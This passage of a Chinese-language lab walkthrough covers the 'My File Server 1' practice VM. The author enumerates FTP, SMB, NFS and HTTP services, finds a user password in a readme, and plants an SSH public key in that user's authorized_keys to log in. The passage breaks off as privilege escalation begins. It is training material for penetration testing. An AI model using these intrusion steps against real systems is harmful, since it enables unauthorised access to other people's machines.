secure</span><br></pre></td></tr></table></figure><p>发现不让下载，可能是目录的权限问题</p><p>还有一个ftp运行在2121端口，匿名登录后发现和21端口并无区别。</p></blockquote><h3 id="尝试smb"><a href="#尝试smb" class="headerlink" title="尝试smb"></a>尝试smb</h3><p>先使用smbmap探测一下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# smbmap -H <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br><span class="line">[+] IP: <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>:<span class="number">445</span>       Name: fileserver                                        </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        <span class="built_in">print</span>$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        smbdata                                                 READ, WRITE     smbdata</span><br><span class="line">        smbuser                                                 NO ACCESS       smbuser</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (Samba <span class="number">4</span>.<span class="number">9</span>.<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>发现smbdata、smbuser。其中smbdata可读写，smbuser无访问权限</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>/smbdata</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/smbdata]</span><br><span class="line">└─# smbclient //<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>/smbdata</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\root]:</span><br><span class="line">Anonymous login successful</span><br><span class="line">Try &quot;<span class="built_in">help</span>&quot; to get a list of possible commands.</span><br><span class="line"><span class="function">smb: \&gt; <span class="title">ls</span> </span></span><br><span class="line"><span class="function">  .                                   <span class="title">D</span>        0  <span class="title">Mon</span> <span class="title">Oct</span> 16 20:22:13 2023</span></span><br><span class="line"><span class="function">  ..                                  <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:47:54 2020</span></span><br><span class="line"><span class="function">  <span class="title">anaconda</span>                            <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:15 2020</span></span><br><span class="line"><span class="function">  <span class="title">audit</span>                               <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:15 2020</span></span><br><span class="line"><span class="function">  <span class="title">boot.log</span>                            <span class="title">N</span>     6120  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">btmp</span>                                <span class="title">N</span>      384  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">cron</span>                                <span class="title">N</span>     4813  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">dmesg</span>                               <span class="title">N</span>    31389  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">dmesg.old</span>                           <span class="title">N</span>    31389  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">glusterfs</span>                           <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">lastlog</span>                             <span class="title">N</span>   292292  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">maillog</span>                             <span class="title">N</span>     1982  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:16 2020</span></span><br><span class="line"><span class="function">  <span class="title">messages</span>                            <span class="title">N</span>   684379  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">ppp</span>                                 <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">samba</span>                               <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">secure</span>                              <span class="title">N</span>    11937  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">spooler</span>                             <span class="title">N</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">tallylog</span>                            <span class="title">N</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">tuned</span>                               <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">wtmp</span>                                <span class="title">N</span>    25728  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">xferlog</span>                             <span class="title">N</span>      100  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">yum.log</span>                             <span class="title">N</span>    10915  <span class="title">Tue</span> <span class="title">Feb</span> 18 19:48:17 2020</span></span><br><span class="line"><span class="function">  <span class="title">sshd_config</span>                         <span class="title">N</span>     3906  <span class="title">Wed</span> <span class="title">Feb</span> 19 15:46:38 2020</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                19976192 <span class="title">blocks</span> <span class="title">of</span> <span class="title">size</span> 1024. 18151588 <span class="title">blocks</span> <span class="title">available</span></span></span><br><span class="line"><span class="function"><span class="title">smb</span>: \&gt; <span class="title">prompt</span></span></span><br><span class="line"><span class="function"><span class="title">smb</span>: \&gt; <span class="title">mget</span> * *.*</span></span><br></pre></td></tr></table></figure><p>发现比之前的ftp多了个sshd_config文件，重点关注这个</p><p>先把所有文件拷贝下来</p></blockquote><h3 id="对下载下来的文件进行分析"><a href="#对下载下来的文件进行分析" class="headerlink" title="对下载下来的文件进行分析"></a>对下载下来的文件进行分析</h3><p>把下载下来的文件都看了一遍。其中cron是自动任务的内容，没有明显的令人感兴趣的信息。</p><p>ssh_config文件上面有关于ssh公钥存放位置的配置：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#PubkeyAuthentication yes </span><br><span class="line"></span><br><span class="line"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="line"># but this is overridden so installations will only check .ssh/authorized_keys</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br></pre></td></tr></table></figure></blockquote><p>secure文件中有一些关于组、用户的操作，其中发现这样的内容</p><blockquote><p>Feb 18 17:16:39 localhost useradd[2389]: new group: name=smbuser, GID=1000<br>Feb 18 17:16:39 localhost useradd[2389]: new user: name=smbuser, UID=1000, GID=1000, home=/home/smbuser, shell=/bin/bash<br>Feb 18 17:17:09 localhost passwd: pam_unix(passwd:chauthtok): password changed for smbuser</p></blockquote><p>chauthtok 很可能是用户 smbuser的密码。</p><p>本来想着尝试smb登录smbuser，想起来smbuser的权限是no access，此路不通</p><p>尝试ftp登录smbuser</p><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/smbdata]</span><br><span class="line">└─# ftp <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br><span class="line">Connected to <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>.</span><br><span class="line"><span class="number">220</span> (vsFTPd <span class="number">3</span>.<span class="number">0</span>.<span class="number">2</span>)</span><br><span class="line">Name (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>:root): smbuser</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line"><span class="function">Password: </span></span><br><span class="line"><span class="function">530 <span class="title">Login</span> <span class="title">incorrect</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>: <span class="title">Login</span> <span class="title">failed</span></span></span><br></pre></td></tr></table></figure><p>失败，看来没这么简单。</p></blockquote><h3 id="尝试nfs"><a href="#尝试nfs" class="headerlink" title="尝试nfs"></a>尝试nfs</h3><p>使用showmount命令显示nfs服务器的共享信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/smbdata]</span><br><span class="line">└─# showmount -e <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br><span class="line">Export list <span class="keyword">for</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>:</span><br><span class="line">/smbdata <span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>限制56网段的用户才能连接。靶机与攻击机处于同一个局域网，可以尝试把本地的ip网段改为56进行连接。</p><p>而smbdata这个目录先前已经看过一个同名的了，先不尝试连接。</p></blockquote><h3 id="尝试80-http服务"><a href="#尝试80-http服务" class="headerlink" title="尝试80 http服务"></a>尝试80 http服务</h3><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231016160013477.png" alt="image-20231016160013477"></p><p>超链接指向一个外网的网址，ctrl+u查看源码无有效信息。</p><h4 id="尝试目录爆破"><a href="#尝试目录爆破" class="headerlink" title="尝试目录爆破"></a>尝试目录爆破</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -x txt,zip,rar,sql -w /usr/share/wordlists/dirbuster/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/smbdata]</span><br><span class="line">└─# gobuster <span class="built_in">dir</span> -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -x txt,zip,rar,sql -w /usr/share/wordlists/dirbuster/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3</span>.<span class="number">5</span></span><br><span class="line">[+] Extensions:              txt,zip,rar,sql</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">10</span>/<span class="number">16</span> <span class="number">16</span>:<span class="number">06</span>:<span class="number">24</span> Starting gobuster <span class="keyword">in</span> directory enumeration <span class="built_in">mode</span></span><br><span class="line">===============================================================</span><br><span class="line">/readme.txt           (Status: <span class="number">200</span>) [Size: <span class="number">25</span>]</span><br><span class="line"><span class="function">Progress: 1099769 / 1102805 (99.72%)</span></span><br><span class="line"><span class="function">===============================================================</span></span><br><span class="line"><span class="function">2023/10/16 16:09:51 <span class="title">Finished</span></span></span><br><span class="line"><span class="function">===============================================================</span></span><br></pre></td></tr></table></figure><p>爆破出readme.txt，访问一下</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231016161117653.png" alt="image-20231016161117653"></p><p>猜测这个是smbuser 的密码，再次尝试ftp登录</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/smbdata]</span><br><span class="line">└─# ftp <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br><span class="line">Connected to <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>.</span><br><span class="line"><span class="number">220</span> (vsFTPd <span class="number">3</span>.<span class="number">0</span>.<span class="number">2</span>)</span><br><span class="line">Name (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>:root): smbuser</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line"><span class="function">Password: </span></span><br><span class="line"><span class="function">230 <span class="title">Login</span> <span class="title">successful</span>.</span></span><br><span class="line"><span class="function"><span class="title">Remote</span> <span class="title">system</span> <span class="title">type</span> <span class="title">is</span> <span class="title">UNIX</span>.</span></span><br><span class="line"><span class="function"><span class="title">Using</span> <span class="title">binary</span> <span class="title">mode</span> <span class="title">to</span> <span class="title">transfer</span> <span class="title">files</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">ls</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||5093|).</span></span><br><span class="line"><span class="function">150 <span class="title">Here</span> <span class="title">comes</span> <span class="title">the</span> <span class="title">directory</span> <span class="title">listing</span>.</span></span><br><span class="line"><span class="function">226 <span class="title">Directory</span> <span class="title">send</span> <span class="title">OK</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">pwd</span></span></span><br><span class="line"><span class="function"><span class="title">Remote</span> <span class="title">directory</span>: /<span class="title">home</span>/<span class="title">smbuser</span></span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">ls</span> -<span class="title">alhi</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||5393|).</span></span><br><span class="line"><span class="function">150 <span class="title">Here</span> <span class="title">comes</span> <span class="title">the</span> <span class="title">directory</span> <span class="title">listing</span>.</span></span><br><span class="line"><span class="function"><span class="title">drwx</span>------    2 1000     1000           94 <span class="title">Oct</span> 15 12:40 .</span></span><br><span class="line"><span class="function"><span class="title">drwxr</span>-<span class="title">xr</span>-<span class="title">x</span>    3 0        0              20 <span class="title">Feb</span> 19  2020 ..</span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 1000     1000           27 <span class="title">Feb</span> 20  2020 .<span class="title">bash_history</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 1000     1000           18 <span class="title">Mar</span> 05  2015 .<span class="title">bash_logout</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 1000     1000          193 <span class="title">Mar</span> 05  2015 .<span class="title">bash_profile</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 1000     1000          231 <span class="title">Mar</span> 05  2015 .<span class="title">bashrc</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 1000     1000          589 <span class="title">Oct</span> 15 12:40 .<span class="title">viminfo</span></span></span><br><span class="line"><span class="function">226 <span class="title">Directory</span> <span class="title">send</span> <span class="title">OK</span>.</span></span><br></pre></td></tr></table></figure><p>这次成功登录，发现这个目录是smbuser的家目录。而且有读写权限。</p><p>见”drwx——    2 1000     1000           94 Oct 15 12:40 .“此记录</p></blockquote><p>前面信息收集时发现ssh只允许使用密钥连接，ssh公钥存放的位置为默认位置（.ssh/authorized_keys）</p><p>而我们拥有了smbuser用户家目录的读写权限，那么可以尝试制作公私钥密码对，把公钥上传至家目录/.ssh/authorized_keys 进行密钥连接。</p><h3 id="尝试ssh"><a href="#尝试ssh" class="headerlink" title="尝试ssh"></a>尝试ssh</h3><p>生成公钥私钥对</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/sshkeygen]</span><br><span class="line">└─# ssh-keygen                       </span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> which to save the key (/root/.ssh/id_rsa): sshkey</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> sshkey</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> sshkey.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line"><span class="function">SHA256:<span class="title">rrSgL96sprCBBVNUbf9ZVriglWLCSrwZsmevm0UEfMA</span> <span class="title">root</span>@<span class="title">lkk</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">key</span>&#x27;<span class="title">s</span> <span class="title">randomart</span> <span class="title">image</span> <span class="title">is</span>:</span></span><br><span class="line"><span class="function">+---[<span class="title">RSA</span> 3072]----+</span></span><br><span class="line"><span class="function">| .<span class="title">o</span>=++     . .   |</span></span><br><span class="line"><span class="function">| .. <span class="title">E</span>.* <span class="title">o</span> + . .  |</span></span><br><span class="line"><span class="function">|<span class="title">o</span>  + <span class="title">B</span>.+ + . <span class="title">o</span>   |</span></span><br><span class="line"><span class="function">| <span class="title">o</span>. *.  <span class="title">o</span>   +    |</span></span><br><span class="line"><span class="function">|  .<span class="title">o</span> .. <span class="title">S</span>. +     |</span></span><br><span class="line"><span class="function">|..   ...  <span class="title">o</span>      |</span></span><br><span class="line"><span class="function">|+   ..<span class="title">o</span> .        |</span></span><br><span class="line"><span class="function">|.<span class="title">oo</span>+.= <span class="title">o</span>         |</span></span><br><span class="line"><span class="function">|<span class="title">o</span>+++*.<span class="title">o</span>          |</span></span><br><span class="line"><span class="function">+----[<span class="title">SHA256</span>]-----+</span></span><br></pre></td></tr></table></figure></blockquote><p>将公钥上传至指定位置</p><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; <span class="built_in">mkdir</span> .ssh</span><br><span class="line"><span class="number">257</span> &quot;/home/smbuser/.ssh&quot; created</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> ./ssh</span><br><span class="line"><span class="number">550</span> Failed to change directory.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> ./.ssh</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">ftp&gt; put ../sshkeygen/sshkey.pub authorized_keys</span><br><span class="line"><span class="function">local: ../<span class="title">sshkeygen</span>/<span class="title">sshkey.pub</span> <span class="title">remote</span>: <span class="title">authorized_keys</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||5107|).</span></span><br><span class="line"><span class="function">150 <span class="title">Ok</span> <span class="title">to</span> <span class="title">send</span> <span class="title">data</span>.</span></span><br><span class="line"><span class="function">100% |**********************************************************************|   562        1.60 <span class="title">MiB</span>/<span class="title">s</span>    00:00 <span class="title">ETA</span></span></span><br><span class="line"><span class="function">226 <span class="title">Transfer</span> <span class="title">complete</span>.</span></span><br><span class="line"><span class="function">562 <span class="title">bytes</span> <span class="title">sent</span> <span class="title">in</span> 00:00 (548.27 <span class="title">KiB</span>/<span class="title">s</span>)</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">ls</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||5376|).</span></span><br><span class="line"><span class="function">150 <span class="title">Here</span> <span class="title">comes</span> <span class="title">the</span> <span class="title">directory</span> <span class="title">listing</span>.</span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 1000     1000          562 <span class="title">Oct</span> 16 16:10 <span class="title">authorized_keys</span></span></span><br><span class="line"><span class="function">226 <span class="title">Directory</span> <span class="title">send</span> <span class="title">OK</span>.</span></span><br></pre></td></tr></table></figure></blockquote><p>尝试连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i </span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/sshkeygen]</span><br><span class="line">└─# ssh -i sshkey smbuser@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br><span class="line">The authenticity of host &#x27;<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:ccn0TgE4/OXtSpg3oMO2gVNYXrps4Zi+XcBgaDZnW78.</span><br><span class="line">This key is <span class="keyword">not</span> known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yew</span><br><span class="line">Please <span class="built_in">type</span> &#x27;yes&#x27;, &#x27;no&#x27; or the fingerprint: yes</span><br><span class="line"><span class="function">Warning: <span class="title">Permanently</span> <span class="title">added</span> &#x27;192.168.31.60&#x27; (<span class="title">ED25519</span>) <span class="title">to</span> <span class="title">the</span> <span class="title">list</span> <span class="title">of</span> <span class="title">known</span> <span class="title">hosts</span>.</span></span><br><span class="line"><span class="function">   ##############################################################################################</span></span><br><span class="line"><span class="function">   #                                      <span class="title">Armour</span> <span class="title">Infosec</span>                                        #</span></span><br><span class="line"><span class="function">   #                         --------- <span class="title">www.armourinfosec.com</span> ------------                       #</span></span><br><span class="line"><span class="function">   #                                    <span class="title">My</span> <span class="title">File</span> <span class="title">Server</span> - 1                                      #</span></span><br><span class="line"><span class="function">   #                               <span class="title">Designed</span> <span class="title">By</span>  :- <span class="title">Akanksha</span> <span class="title">Sachin</span> <span class="title">Verma</span>                        #</span></span><br><span class="line"><span class="function">   #                               <span class="title">Twitter</span>      :- @<span class="title">akankshavermasv</span>                             #</span></span><br><span class="line"><span class="function">   ##############################################################################################</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">login</span>: <span class="title">Sun</span> <span class="title">Oct</span> 15 18:09:30 2023</span></span><br><span class="line"><span class="function">[<span class="title">smbuser</span>@<span class="title">fileserver</span> ~]$ <span class="title">exit</span></span></span><br></pre></td></tr></table></figure><p>登录成功</p></blockquote><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看用户名</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>查看系统信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/sshkeygen]</span><br><span class="line">└─# ssh -i sshkey smbuser@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span></span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      Armour Infosec                                        #</span><br><span class="line">   #                         --------- www.armourinfosec.com ------------                       #</span><br><span class="line">   #                                    My File Server - <span class="number">1</span>                                      #</span><br><span class="line">   #                               Designed By  :- Akanksha Sachin Verma                        #</span><br><span class="line">   #                               Twitter      :- @akankshavermasv                             #</span><br><span class="line">   ##############################################################################################</span><br><span class="line"></span><br><span class="line">Last login: Mon Oct <span class="number">16</span> <span class="number">21</span>:<span class="number">48</span>:<span class="number">22</span> <span class="number">2023</span> from lkk</span><br><span class="line">[smbuser@fileserver ~]$ whoami</span><br><span class="line">smbuser</span><br><span class="line">[smbuser@fileserver ~]$ uname -a</span><br><span class="line">Linux fileserver <span class="number">3</span>.<span class="number">10</span>.<span class="number">0</span>-<span class="number">229</span>.el7.x86_64 #<span class="number">1</span> SMP Fri Mar <span class="number">6</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">42</span> UTC <span class="number">2015</span> x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[smbuser@fileserver 